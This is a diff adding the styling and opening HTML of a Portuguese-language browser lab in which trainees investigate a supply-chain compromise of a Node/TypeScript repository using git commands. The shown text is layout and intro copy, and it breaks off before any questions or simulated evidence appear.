@@ -1,0 +1,3240 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Git Forensics Lab: Supply Chain Attack</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&family=Syne:wght@400;600;700;800&family=Space+Grotesk:wght@300;400;500;600&display=swap');
+
+:root {
+  --bg: #0a0b0f;
+  --bg2: #0f1118;
+  --bg3: #141720;
+  --surface: #1a1e2e;
+  --surface2: #212638;
+  --border: #2a3050;
+  --border2: #353d5c;
+  --text: #e2e8f8;
+  --text2: #8892b0;
+  --text3: #4a5280;
+  --green: #00ff88;
+  --green2: #00cc6a;
+  --red: #ff4466;
+  --red2: #cc2244;
+  --yellow: #ffcc00;
+  --yellow2: #e6b800;
+  --cyan: #00d4ff;
+  --cyan2: #00aacc;
+  --purple: #9d4edd;
+  --orange: #ff8c42;
+  --accent: #00ff88;
+  --glow: 0 0 20px rgba(0,255,136,0.3);
+  --glow-red: 0 0 20px rgba(255,68,102,0.3);
+  --font-mono: 'JetBrains Mono', monospace;
+  --font-ui: 'Syne', sans-serif;
+  --font-body: 'Space Grotesk', sans-serif;
+}
+
+* { margin:0; padding:0; box-sizing:border-box; }
+html { scroll-behavior: smooth; height: 100%; }
+body { min-height: 100%; }
+
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: var(--font-body);
+  min-height: 100vh;
+  overflow-x: hidden;
+  overscroll-behavior-y: auto;
+}
+
+
+/* Grid background */
+body::before {
+  content: '';
+  position: fixed;
+  inset: 0;
+  background-image:
+    linear-gradient(rgba(0,255,136,0.02) 1px, transparent 1px),
+    linear-gradient(90deg, rgba(0,255,136,0.02) 1px, transparent 1px);
+  background-size: 40px 40px;
+  pointer-events: none;
+  z-index: 0;
+}
+
+/* Scanlines */
+body::after {
+  content: '';
+  position: fixed;
+  inset: 0;
+  background: repeating-linear-gradient(
+    0deg,
+    transparent,
+    transparent 2px,
+    rgba(0,0,0,0.05) 2px,
+    rgba(0,0,0,0.05) 4px
+  );
+  pointer-events: none;
+  z-index: 0;
+}
+
+.app {
+  position: relative;
+  z-index: 1;
+  min-height: 100vh;
+}
+
+/* ===== HEADER ===== */
+.header {
+  padding: 20px 32px;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  border-bottom: 1px solid var(--border);
+  background: rgba(10,11,15,0.8);
+  backdrop-filter: blur(20px);
+  position: sticky;
+  top: 0;
+  z-index: 100;
+}
+
+.logo {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+}
+
+.logo-icon {
+  width: 36px;
+  height: 36px;
+  background: linear-gradient(135deg, var(--green), var(--cyan));
+  border-radius: 8px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 18px;
+  font-family: var(--font-mono);
+  font-weight: 700;
+  color: #000;
+  box-shadow: var(--glow);
+}
+
+.logo-text {
+  font-family: var(--font-ui);
+  font-weight: 800;
+  font-size: 18px;
+  letter-spacing: -0.5px;
+}
+
+.logo-text span { color: var(--green); }
+
+.header-controls {
+  display: flex;
+  align-items: center;
+  gap: 16px;
+}
+
+.mute-btn {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  color: var(--text2);
+  padding: 8px 12px;
+  border-radius: 8px;
+  cursor: pointer;
+  font-size: 16px;
+  transition: all 0.2s;
+}
+.mute-btn:hover { border-color: var(--green); color: var(--green); }
+
+.progress-bar-wrap {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  font-size: 13px;
+  color: var(--text2);
+  font-family: var(--font-mono);
+}
+
+.progress-bar {
+  width: 140px;
+  height: 6px;
+  background: var(--surface);
+  border-radius: 99px;
+  overflow: hidden;
+}
+
+.progress-fill {
+  height: 100%;
+  background: linear-gradient(90deg, var(--green), var(--cyan));
+  border-radius: 99px;
+  transition: width 0.5s cubic-bezier(0.4,0,0.2,1);
+  box-shadow: 0 0 8px rgba(0,255,136,0.5);
+}
+
+/* ===== MAIN LAYOUT ===== */
+.main {
+  display: grid;
+  grid-template-columns: minmax(0, 1fr) 420px;
+  gap: 0;
+  height: calc(100dvh - 70px);
+  min-height: 0;
+  overflow: hidden;
+}
+
+/* ===== TERMINAL ===== */
+.terminal-panel {
+  display: flex;
+  flex-direction: column;
+  border-right: 1px solid var(--border);
+  min-height: 0;
+  overflow: hidden;
+}
+
+.terminal-header {
+  padding: 12px 20px;
+  background: var(--bg2);
+  border-bottom: 1px solid var(--border);
+  display: flex;
+  align-items: center;
+  gap: 12px;
+}
+
+.terminal-dots {
+  display: flex;
+  gap: 6px;
+}
+
+.dot {
+  width: 12px;
+  height: 12px;
+  border-radius: 50%;
+}
+.dot-red { background: #ff5f57; }
+.dot-yellow { background: #febc2e; }
+.dot-green { background: #28c840; }
+
+.terminal-title {
+  font-family: var(--font-mono);
+  font-size: 12px;
+  color: var(--text3);
+  flex: 1;
+  text-align: center;
+}
+
+.terminal-body {
+  flex: 1 1 auto;
+  min-height: 0;
+  overflow-y: auto;
+  overscroll-behavior: contain;
+  padding: 20px;
+  font-family: var(--font-mono);
+  font-size: 13px;
+  line-height: 1.6;
+  background: var(--bg);
+  cursor: text;
+}
+
+.terminal-body::-webkit-scrollbar { width: 4px; }
+.terminal-body::-webkit-scrollbar-track { background: transparent; }
+.terminal-body::-webkit-scrollbar-thumb { background: var(--border2); border-radius: 2px; }
+
+.terminal-output { color: var(--text); white-space: pre-wrap; word-break: break-word; }
+.terminal-output.error { color: var(--red); }
+.terminal-output.success { color: var(--green); }
+.terminal-output.warning { color: var(--yellow); }
+.terminal-output.info { color: var(--cyan); }
+.terminal-output.dim { color: var(--text3); }
+.terminal-output.highlight { color: var(--orange); }
+
+.terminal-line {
+  display: flex;
+  align-items: flex-start;
+  gap: 8px;
+  margin-bottom: 2px;
+  animation: fadeIn 0.15s ease;
+}
+
+.prompt {
+  color: var(--green);
+  white-space: nowrap;
+  flex-shrink: 0;
+}
+
+.prompt-path { color: var(--cyan); }
+
+.terminal-input-line {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  padding: 12px 20px;
+  background: var(--bg2);
+  border-top: 1px solid var(--border);
+}
+
+.terminal-input {
+  flex: 1;
+  background: transparent;
+  border: none;
+  outline: none;
+  color: var(--text);
+  font-family: var(--font-mono);
+  font-size: 13px;
+  caret-color: var(--green);
+}
+
+.cursor-blink {
+  width: 8px;
+  height: 14px;
+  background: var(--green);
+  animation: blink 1s step-end infinite;
+  display: inline-block;
+  vertical-align: middle;
+}
+
+@keyframes blink { 0%,100% { opacity:1; } 50% { opacity:0; } }
+@keyframes fadeIn { from { opacity:0; transform: translateY(2px); } to { opacity:1; transform: none; } }
+
+/* ===== SIDE PANEL ===== */
+.side-panel {
+  display: flex;
+  flex-direction: column;
+  overflow: hidden;
+  min-height: 0;
+}
+
+.phase-header {
+  padding: 20px 24px;
+  background: var(--bg2);
+  border-bottom: 1px solid var(--border);
+}
+
+.phase-badge {
+  display: inline-flex;
+  align-items: center;
+  gap: 6px;
+  background: rgba(0,255,136,0.1);
+  border: 1px solid rgba(0,255,136,0.3);
+  color: var(--green);
+  padding: 4px 10px;
+  border-radius: 99px;
+  font-size: 11px;
+  font-family: var(--font-mono);
+  font-weight: 500;
+  margin-bottom: 12px;
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+}
+
+.phase-title {
+  font-family: var(--font-ui);
+  font-size: 20px;
+  font-weight: 700;
+  line-height: 1.2;
+  margin-bottom: 8px;
+}
+
+.phase-desc {
+  font-size: 13px;
+  color: var(--text2);
+  line-height: 1.5;
+}
+
+.hint-section {
+  padding: 16px 24px;
+  border-bottom: 1px solid var(--border);
+}
+
+.hint-title {
+  font-size: 11px;
+  color: var(--text3);
+  font-family: var(--font-mono);
+  text-transform: uppercase;
+  letter-spacing: 1px;
+  margin-bottom: 8px;
+  display: flex;
+  align-items: center;
+  gap: 6px;
+}
+
+.hint-title::before {
+  content: '→';
+  color: var(--yellow);
+}
+
+.hint-chip {
+  display: inline-flex;
+  align-items: center;
+  gap: 6px;
+  background: var(--surface);
+  border: 1px solid var(--border);
+  color: var(--cyan);
+  padding: 5px 10px;
+  border-radius: 6px;
+  font-size: 12px;
+  font-family: var(--font-mono);
+  margin: 3px 3px 3px 0;
+  cursor: pointer;
+  transition: all 0.2s;
+}
+
+.hint-chip:hover {
+  background: rgba(0,212,255,0.1);
+  border-color: var(--cyan);
+  box-shadow: 0 0 10px rgba(0,212,255,0.2);
+}
+
+.hint-chip:active { transform: scale(0.97); }
+
+/* ===== QUESTIONS ===== */
+.questions-section {
+  flex: 1 1 auto;
+  min-height: 0;
+  overflow-y: auto;
+  overscroll-behavior: contain;
+  padding: 20px 24px;
+}
+
+.questions-section::-webkit-scrollbar { width: 4px; }
+.questions-section::-webkit-scrollbar-thumb { background: var(--border2); border-radius: 2px; }
+
+.question-card {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: 12px;
+  padding: 16px;
+  margin-bottom: 16px;
+  transition: all 0.3s;
+}
+
+.question-card.active {
+  border-color: rgba(0,255,136,0.4);
+  box-shadow: 0 0 20px rgba(0,255,136,0.08);
+}
+
+.question-card.locked {
+  opacity: 0.4;
+  pointer-events: none;
+}
+
+.question-card.correct {
+  border-color: rgba(0,255,136,0.5);
+  background: rgba(0,255,136,0.05);
+}
+
+.question-card.wrong {
+  border-color: rgba(255,68,102,0.4);
+  background: rgba(255,68,102,0.03);
+  animation: shake 0.3s ease;
+}
+
+@keyframes shake {
+  0%,100% { transform: translateX(0); }
+  25% { transform: translateX(-4px); }
+  75% { transform: translateX(4px); }
+}
+
+.q-number {
+  font-size: 10px;
+  color: var(--text3);
+  font-family: var(--font-mono);
+  text-transform: uppercase;
+  letter-spacing: 1px;
+  margin-bottom: 8px;
+}
+
+.q-text {
+  font-size: 14px;
+  font-weight: 500;
+  line-height: 1.4;
+  margin-bottom: 14px;
+  color: var(--text);
+}
+
+.q-options {
+  display: flex;
+  flex-direction: column;
+  gap: 8px;
+}
+
+.q-option {
+  display: flex;
+  align-items: flex-start;
+  gap: 10px;
+  padding: 10px 12px;
+  background: var(--bg3);
+  border: 1px solid var(--border);
+  border-radius: 8px;
+  cursor: pointer;
+  transition: all 0.2s;
+  font-size: 13px;
+  font-family: var(--font-mono);
+  line-height: 1.4;
+  text-align: left;
+  color: var(--text);
+  width: 100%;
+}
+
+.q-option:hover {
+  border-color: var(--border2);
+  background: var(--surface2);
+  transform: translateX(2px);
+}
+
+.q-option.selected-correct {
+  border-color: var(--green);
+  background: rgba(0,255,136,0.1);
+  color: var(--green);
+}
+
+.q-option.selected-wrong {
+  border-color: var(--red);
+  background: rgba(255,68,102,0.1);
+  color: var(--red);
+}
+
+.q-option.show-correct {
+  border-color: var(--green);
+  color: var(--green2);
+}
+
+.opt-letter {
+  flex-shrink: 0;
+  width: 20px;
+  height: 20px;
+  border-radius: 50%;
+  background: var(--surface2);
+  border: 1px solid var(--border2);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 10px;
+  font-weight: 700;
+}
+
+.q-feedback {
+  margin-top: 10px;
+  padding: 10px 12px;
+  border-radius: 8px;
+  font-size: 12px;
+  line-height: 1.5;
+  display: none;
+}
+
+.q-feedback.correct {
+  background: rgba(0,255,136,0.08);
+  border: 1px solid rgba(0,255,136,0.2);
+  color: var(--green2);
+  display: block;
+}
+
+.q-feedback.wrong {
+  background: rgba(255,68,102,0.08);
+  border: 1px solid rgba(255,68,102,0.2);
+  color: var(--red);
+  display: block;
+}
+
+/* ===== SCOREBOARD ===== */
+.score-widget {
+  padding: 16px 24px;
+  border-top: 1px solid var(--border);
+  background: var(--bg2);
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+}
+
+.score-info {
+  font-family: var(--font-mono);
+  font-size: 12px;
+  color: var(--text2);
+}
+
+.score-value {
+  font-family: var(--font-ui);
+  font-size: 24px;
+  font-weight: 800;
+  color: var(--green);
+}
+
+/* ===== MODAL ===== */
+.modal-overlay {
+  position: fixed;
+  inset: 0;
+  background: rgba(0,0,0,0.85);
+  backdrop-filter: blur(8px);
+  z-index: 1000;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  padding: 20px;
+  opacity: 0;
+  pointer-events: none;
+  transition: opacity 0.3s;
+}
+
+.modal-overlay.visible {
+  opacity: 1;
+  pointer-events: all;
+}
+
+.modal {
+  background: var(--bg2);
+  border: 1px solid var(--border);
+  border-radius: 16px;
+  padding: 32px;
+  max-width: 520px;
+  width: 100%;
+  transform: translateY(20px) scale(0.97);
+  transition: transform 0.3s;
+  box-shadow: 0 40px 80px rgba(0,0,0,0.6);
+}
+
+.modal-overlay.visible .modal { transform: none; }
+
+.modal h2 {
+  font-family: var(--font-ui);
+  font-size: 24px;
+  font-weight: 800;
+  margin-bottom: 12px;
+}
+
+.modal p { color: var(--text2); font-size: 14px; line-height: 1.6; margin-bottom: 20px; }
+
+.modal-input {
+  width: 100%;
+  background: var(--bg3);
+  border: 1px solid var(--border);
+  border-radius: 10px;
+  padding: 12px 16px;
+  color: var(--text);
+  font-family: var(--font-mono);
+  font-size: 14px;
+  outline: none;
+  margin-bottom: 16px;
+  transition: border-color 0.2s;
+}
+
+.modal-input:focus { border-color: var(--green); }
+
+.btn {
+  padding: 12px 24px;
+  border-radius: 10px;
+  font-family: var(--font-ui);
+  font-weight: 700;
+  font-size: 14px;
+  cursor: pointer;
+  border: none;
+  transition: all 0.2s;
+}
+
+.btn-primary {
+  background: linear-gradient(135deg, var(--green), var(--cyan));
+  color: #000;
+  box-shadow: 0 0 20px rgba(0,255,136,0.3);
+}
+.btn-primary:hover { transform: translateY(-2px); box-shadow: 0 0 30px rgba(0,255,136,0.5); }
+
+.btn-secondary {
+  background: var(--surface);
+  color: var(--text);
+  border: 1px solid var(--border);
+}
+.btn-secondary:hover { border-color: var(--border2); }
+
+/* ===== RESULTS SCREEN ===== */
+.results-screen {
+  position: fixed;
+  inset: 0;
+  height: 100dvh;
+  background: var(--bg);
+  z-index: 500;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: flex-start;
+  padding: 40px 40px 80px;
+  overflow-y: auto;
+  overflow-x: hidden;
+  overscroll-behavior: contain;
+  -webkit-overflow-scrolling: touch;
+  display: none;
+}
+
+.results-screen::-webkit-scrollbar { width: 6px; }
+.results-screen::-webkit-scrollbar-track { background: var(--bg2); }
+.results-screen::-webkit-scrollbar-thumb { background: var(--border2); border-radius: 3px; }
+.results-screen::-webkit-scrollbar-thumb:hover { background: var(--green); }
+
+.results-screen.visible { display: flex; }
+
+.results-icon {
+  font-size: 64px;
+  margin-bottom: 16px;
+  margin-top: 20px;
+  animation: pulse 2s ease-in-out infinite;
+}
+
+@keyframes pulse {
+  0%,100% { transform: scale(1); }
+  50% { transform: scale(1.05); }
+}
+
+.results-title {
+  font-family: var(--font-ui);
+  font-size: 40px;
+  font-weight: 800;
+  margin-bottom: 8px;
+  text-align: center;
+}
+
+.results-subtitle {
+  color: var(--text2);
+  font-size: 16px;
+  margin-bottom: 32px;
+  text-align: center;
+  font-family: var(--font-mono);
+}
+
+.results-score-big {
+  font-family: var(--font-ui);
+  font-size: 80px;
+  font-weight: 800;
+  color: var(--green);
+  margin-bottom: 4px;
+  text-shadow: var(--glow);
+}
+
+.results-score-label {
+  font-size: 14px;
+  color: var(--text3);
+  font-family: var(--font-mono);
+  margin-bottom: 32px;
+}
+
+.results-stats {
+  display: grid;
+  grid-template-columns: repeat(3, 1fr);
+  gap: 16px;
+  margin-bottom: 32px;
+  width: 100%;
+  max-width: 480px;
+}
+
+.stat-box {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: 12px;
+  padding: 16px;
+  text-align: center;
+}
+
+.stat-value {
+  font-family: var(--font-ui);
+  font-size: 28px;
+  font-weight: 800;
+  color: var(--cyan);
+  margin-bottom: 4px;
+}
+
+.stat-label {
+  font-size: 11px;
+  color: var(--text3);
+  font-family: var(--font-mono);
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+}
+
+.cert-form {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: 12px;
+  padding: 20px;
+  width: 100%;
+  max-width: 480px;
+  margin-bottom: 20px;
+}
+
+.cert-form label {
+  display: block;
+  font-size: 12px;
+  color: var(--text2);
+  font-family: var(--font-mono);
+  margin-bottom: 8px;
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+}
+
+.cert-form input {
+  width: 100%;
+  background: var(--bg3);
+  border: 1px solid var(--border);
+  border-radius: 8px;
+  padding: 10px 14px;
+  color: var(--text);
+  font-family: var(--font-mono);
+  font-size: 14px;
+  outline: none;
+  transition: border-color 0.2s;
+}
+
+.cert-form input:focus { border-color: var(--green); }
+
+.results-actions {
+  display: flex;
+  gap: 12px;
+  flex-wrap: wrap;
+  justify-content: center;
+}
+
+/* ===== CERT CANVAS ===== */
+#cert-canvas {
+  display: none;
+  border-radius: 12px;
+  margin-top: 24px;
+  margin-bottom: 8px;
+  max-width: 100%;
+  width: 100%;
+  max-width: 880px;
+  box-shadow: 0 20px 60px rgba(0,0,0,0.5);
+  flex-shrink: 0;
+}
+
+/* ===== INTRO ===== */
+.intro-screen {
+  position: fixed;
+  inset: 0;
+  height: 100dvh;
+  background: var(--bg);
+  z-index: 900;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: flex-start;
+  padding: 48px 40px 72px;
+  text-align: center;
+  overflow-y: auto;
+  overflow-x: hidden;
+  overscroll-behavior: contain;
+  -webkit-overflow-scrolling: touch;
+}
+
+.intro-badge {
+  background: rgba(255,68,102,0.15);
+  border: 1px solid rgba(255,68,102,0.4);
+  color: var(--red);
+  padding: 6px 16px;
+  border-radius: 99px;
+  font-size: 12px;
+  font-family: var(--font-mono);
+  text-transform: uppercase;
+  letter-spacing: 1px;
+  margin-bottom: 24px;
+  animation: pulseBorder 2s ease-in-out infinite;
+}
+
+@keyframes pulseBorder {
+  0%,100% { box-shadow: 0 0 0 0 rgba(255,68,102,0); }
+  50% { box-shadow: 0 0 0 8px rgba(255,68,102,0); }
+}
+
+.intro-title {
+  font-family: var(--font-ui);
+  font-size: clamp(28px, 5vw, 52px);
+  font-weight: 800;
+  line-height: 1.1;
+  margin-bottom: 16px;
+  letter-spacing: -1px;
+}
+
+.intro-title .accent { color: var(--green); }
+.intro-title .danger { color: var(--red); }
+
+.intro-subtitle {
+  color: var(--text2);
+  font-size: 16px;
+  max-width: 560px;
+  line-height: 1.6;
+  margin-bottom: 40px;
+  font-family: var(--font-body);
+}
+
+.intro-cards {
+  display: grid;
+  grid-template-columns: repeat(3, 1fr);
+  gap: 16px;
+  max-width: 700px;
+  width: 100%;
+  margin-bottom: 40px;
+}
+
+.intro-card {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: 12px;
+  padding: 20px;
+  text-align: left;
+}
+
+.intro-card-icon { font-size: 24px; margin-bottom: 12px; }
+
+.intro-card-title {
+  font-family: var(--font-ui);
+  font-weight: 700;
+  font-size: 15px;
+  margin-bottom: 6px;
+}
+
+.intro-card-desc {
+  font-size: 13px;
+  color: var(--text2);
+  line-height: 1.4;
+}
+
+.warning-box {
+  background: rgba(255,204,0,0.08);
+  border: 1px solid rgba(255,204,0,0.3);
+  border-radius: 10px;
+  padding: 14px 20px;
+  font-size: 13px;
+  color: var(--yellow);
+  font-family: var(--font-mono);
+  max-width: 560px;
+  margin-bottom: 32px;
+  text-align: left;
+}
+
+.warning-box strong { color: var(--yellow2); }
+
+/* Phase nav dots */
+.phase-dots {
+  display: flex;
+  gap: 6px;
+  margin-bottom: 16px;
+}
+
+.phase-dot {
+  width: 8px;
+  height: 8px;
+  border-radius: 50%;
+  background: var(--border2);
+  transition: all 0.3s;
+}
+
+.phase-dot.done { background: var(--green); }
+.phase-dot.active { background: var(--cyan); box-shadow: 0 0 8px var(--cyan); }
+
+/* Toast */
+.toast {
+  position: fixed;
+  bottom: 24px;
+  left: 50%;
+  transform: translateX(-50%) translateY(80px);
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: 10px;
+  padding: 12px 20px;
+  font-family: var(--font-mono);
+  font-size: 13px;
+  z-index: 9999;
+  transition: transform 0.3s cubic-bezier(0.4,0,0.2,1);
+  white-space: nowrap;
+}
+
+.toast.visible { transform: translateX(-50%) translateY(0); }
+.toast.toast-success { border-color: var(--green); color: var(--green); }
+.toast.toast-error { border-color: var(--red); color: var(--red); }
+
+/* ===== MOBILE TABS NAV ===== */
+.mobile-tabs { display: none; }
+
+@media (max-width: 768px) {
+  /* Header */
+  .header { padding: 10px 14px; gap: 8px; }
+  .logo-text { font-size: 15px; }
+  .logo-icon { width: 30px; height: 30px; font-size: 13px; }
+  .progress-bar-wrap { display: none; }
+  .mute-btn { padding: 6px 10px; font-size: 14px; }
+
+  /* Main layout */
+  .main {
+    display: flex;
+    flex-direction: column;
+    height: calc(100dvh - 56px);
+    overflow: hidden;
+  }
+
+  /* Mobile tab bar */
+  .mobile-tabs {
+    display: flex;
+    background: var(--bg2);
+    border-bottom: 1px solid var(--border);
+    flex-shrink: 0;
+    z-index: 10;
+  }
+
+  .mobile-tab {
+    flex: 1;
+    padding: 10px 6px;
+    text-align: center;
+    font-family: var(--font-mono);
+    font-size: 11px;
+    color: var(--text3);
+    cursor: pointer;
+    border-bottom: 2px solid transparent;
+    transition: all 0.2s;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 3px;
+    user-select: none;
+    -webkit-tap-highlight-color: transparent;
+  }
+
+  .mobile-tab.active {
+    color: var(--green);
+    border-bottom-color: var(--green);
+    background: rgba(0,255,136,0.04);
+  }
+
+  .mobile-tab-icon { font-size: 16px; }
+  .mobile-tab-label { font-size: 10px; letter-spacing: 0.3px; }
+
+  /* Panel toggle */
+  .terminal-panel {
+    display: none;
+    flex: 1;
+    min-height: 0;
+    overflow: hidden;
+  }
+  .terminal-panel.mobile-active { display: flex; flex-direction: column; }
+
+  .side-panel {
+    display: none;
+    flex: 1;
+    min-height: 0;
+    overflow: hidden;
+    border-right: none;
+  }
+  .side-panel.mobile-active { display: flex; flex-direction: column; }
+
+  /* Terminal internals */
+  .terminal-header { padding: 8px 14px; }
+  .terminal-title { font-size: 10px; }
+  .terminal-body {
+    padding: 12px 14px;
+    font-size: 12px;
+    flex: 1;
+    min-height: 0;
+    overflow-y: auto;
+    -webkit-overflow-scrolling: touch;
+  }
+  .terminal-input-line { padding: 10px 14px; gap: 6px; }
+  .terminal-input { font-size: 14px; }
+
+  /* Side panel internals */
+  .phase-header { padding: 14px 16px; }
+  .phase-title { font-size: 17px; }
+  .phase-desc { font-size: 12px; }
+  .phase-badge { font-size: 10px; }
+  .hint-section { padding: 12px 16px; }
+  .hint-chip { font-size: 11px; padding: 6px 10px; }
+  .questions-section {
+    flex: 1;
+    min-height: 0;
+    overflow-y: auto;
+    -webkit-overflow-scrolling: touch;
+    padding: 14px 16px;
+  }
+  .question-card { padding: 14px; margin-bottom: 12px; }
+  .q-text { font-size: 13px; }
+  .q-option { font-size: 12px; padding: 10px 10px; }
+  .q-feedback { font-size: 11px; }
+  .score-widget { padding: 10px 16px; }
+  .score-value { font-size: 20px; }
+  .score-info { font-size: 11px; }
+
+  /* Intro screen */
+  .intro-screen {
+    height: 100dvh;
+    min-height: 0;
+    padding: 28px 20px calc(56px + env(safe-area-inset-bottom));
+    justify-content: flex-start;
+    align-items: center;
+    overflow-y: auto;
+    overflow-x: hidden;
+    -webkit-overflow-scrolling: touch;
+    overscroll-behavior: contain;
+  }
+  .intro-badge { font-size: 10px; margin-bottom: 16px; }
+  .intro-title { font-size: clamp(22px, 7vw, 36px); margin-bottom: 12px; }
+  .intro-subtitle { font-size: 14px; margin-bottom: 24px; }
+  .intro-cards { grid-template-columns: 1fr; gap: 10px; margin-bottom: 20px; }
+  .intro-card { padding: 14px; }
+  .intro-card-icon { font-size: 20px; margin-bottom: 8px; }
+  .intro-card-title { font-size: 14px; }
+  .intro-card-desc { font-size: 12px; }
+  .warning-box { font-size: 12px; padding: 12px 14px; margin-bottom: 24px; }
+
+  /* Results screen */
+  .results-screen { height: 100dvh; padding: 24px 20px calc(70px + env(safe-area-inset-bottom)); justify-content: flex-start; overflow-y: auto; -webkit-overflow-scrolling: touch; }
+  .results-icon { font-size: 48px; margin-top: 10px; margin-bottom: 12px; }
+  .results-title { font-size: 28px; }
+  .results-subtitle { font-size: 13px; margin-bottom: 20px; }
+  .results-score-big { font-size: 60px; margin-bottom: 4px; }
+  .results-score-label { margin-bottom: 20px; }
+  .results-stats { grid-template-columns: repeat(3, 1fr); gap: 10px; margin-bottom: 20px; }
+  .stat-box { padding: 12px 8px; }
+  .stat-value { font-size: 22px; }
+  .stat-label { font-size: 10px; }
+  .cert-form { padding: 16px; }
+  .cert-form label { font-size: 11px; }
+  .cert-form input { font-size: 14px; }
+  #cert-canvas { border-radius: 8px; margin-top: 16px; }
+  .results-actions { margin-top: 16px; }
+
+  /* Toast */
+  .toast { font-size: 12px; padding: 10px 16px; white-space: normal; max-width: 90vw; text-align: center; }
+}
+
+
+@media (max-height: 720px) and (min-width: 769px) {
+  .intro-screen {
+    justify-content: flex-start;
+    padding-top: 28px;
+    padding-bottom: 72px;
+  }
+  .intro-badge { margin-bottom: 14px; }
+  .intro-title { font-size: clamp(26px, 4vw, 42px); }
+  .intro-subtitle { margin-bottom: 22px; }
+  .intro-cards { margin-bottom: 22px; }
+  .warning-box { margin-bottom: 22px; }
+}
+
+</style>
+</head>
+<body>
+
+<!-- INTRO SCREEN -->
+<div class="intro-screen" id="intro-screen">
+  <div class="intro-badge">🚨 INCIDENTE ATIVO · CLASSIFICADO: CRÍTICO</div>
+  <h1 class="intro-title">
+    Git <span class="accent">Forensics</span> Lab:<br>
+    <span class="danger">Supply Chain Attack</span>
+  </h1>
+  <p class="intro-subtitle">
+    Você vai investigar um repositório Node/TypeScript comprometido usando comandos de Git e leitura de arquivos.
+    O objetivo é correlacionar commits, dependências, lifecycle hooks, CI/CD e secrets para apontar a causa raiz.
+    As questões não pedem a alternativa “bonitinha”: pedem a MAIS defensável tecnicamente.
+  </p>
+  
+  <div class="intro-cards">
+    <div class="intro-card">
+      <div class="intro-card-icon">🔍</div>
+      <div class="intro-card-title">Análise Forense</div>
+      <div class="intro-card-desc">Use git log, show, blame, grep, cat e diff para sustentar evidências</div>
+    </div>
+    <div class="intro-card">
+      <div class="intro-card-icon">🧪</div>
+      <div class="intro-card-title">5 Fases</div>
+      <div class="intro-card-desc">Fases travadas: erre, revise no terminal e tente de novo</div>
+    </div>
+    <div class="intro-card">
+      <div class="intro-card-icon">🏆</div>
+      <div class="intro-card-title">Certificado</div>
+      <div class="intro-card-desc">Certificado PNG liberado ao concluir o lab com score mínimo</div>
+    </div>
+  </div>
+  
+  <div class="warning-box">
+    <strong>⚠️ COMO FUNCIONA:</strong> primeiro investigue pelo terminal; depois responda as questões da fase.
+    Os comandos exibem evidências coerentes com o repositório virtual. Se errar, a fase não avança: volte ao terminal, valide melhor e refaça.
+    O progresso fica salvo no localStorage deste navegador.
+  </div>
+  
+  <button class="btn btn-primary" onclick="startLab()" style="font-size:16px;padding:16px 40px;">
+    Iniciar Investigação →
+  </button>
+</div>
+
+<!-- MAIN APP -->
+<div class="app" id="main-app" style="display:none">
+  <!-- HEADER -->
+  <div class="header">
+    <div class="logo">
+      <div class="logo-icon">git</div>
+      <div class="logo-text">Forensics<span>Lab</span></div>
+    </div>
+    <div class="header-controls">
+      <div class="progress-bar-wrap">
+        <span id="progress-text">0/20</span>
+        <div class="progress-bar">
+          <div class="progress-fill" id="progress-fill" style="width:0%"></div>
+        </div>
+      </div>
+      <button class="mute-btn" id="mute-btn" onclick="toggleMute()" title="Mute/Unmute">🔊</button>
+    </div>
+  </div>
+
+  <!-- MOBILE TAB BAR -->
+  <div class="mobile-tabs" id="mobile-tabs">
+    <div class="mobile-tab active" id="tab-terminal" onclick="switchMobileTab('terminal')">
+      <span class="mobile-tab-icon">⌨️</span>
+      <span class="mobile-tab-label">TERMINAL</span>
+    </div>
+    <div class="mobile-tab" id="tab-questions" onclick="switchMobileTab('questions')">
+      <span class="mobile-tab-icon">🔍</span>
+      <span class="mobile-tab-label">QUESTÕES</span>
+    </div>
+  </div>
+
+  <!-- MAIN LAYOUT -->
+  <div class="main">
+    <!-- TERMINAL -->
+    <div class="terminal-panel mobile-active" id="terminal-panel">
+      <div class="terminal-header">
+        <div class="terminal-dots">
+          <div class="dot dot-red"></div>
+          <div class="dot dot-yellow"></div>
+          <div class="dot dot-green"></div>
+        </div>
+        <div class="terminal-title">forensics@incident-response:~/compromised-repo</div>
+      </div>
+      <div class="terminal-body" id="terminal-body" onclick="focusInput()">
+        <!-- Output here -->
+      </div>
+      <div class="terminal-input-line">
+        <span class="prompt"><span class="prompt-path">~/compromised-repo</span> $</span>
+        <input type="text" class="terminal-input" id="terminal-input" 
+               placeholder="digite um comando..." autocomplete="off" autocorrect="off" 
+               autocapitalize="off" spellcheck="false">
+      </div>
+    </div>
+
+    <!-- SIDE PANEL -->
+    <div class="side-panel" id="side-panel">
+      <div class="phase-header">
+        <div class="phase-dots" id="phase-dots">
+          <div class="phase-dot active"></div>
+          <div class="phase-dot"></div>
+          <div class="phase-dot"></div>
+          <div class="phase-dot"></div>
+          <div class="phase-dot"></div>
+        </div>
+        <div class="phase-badge" id="phase-badge">📍 Fase 1 de 5</div>
+        <div class="phase-title" id="phase-title">Localizar o Commit Suspeito</div>
+        <div class="phase-desc" id="phase-desc">
+          Analise o histórico de commits e identifique onde o código malicioso foi introduzido.
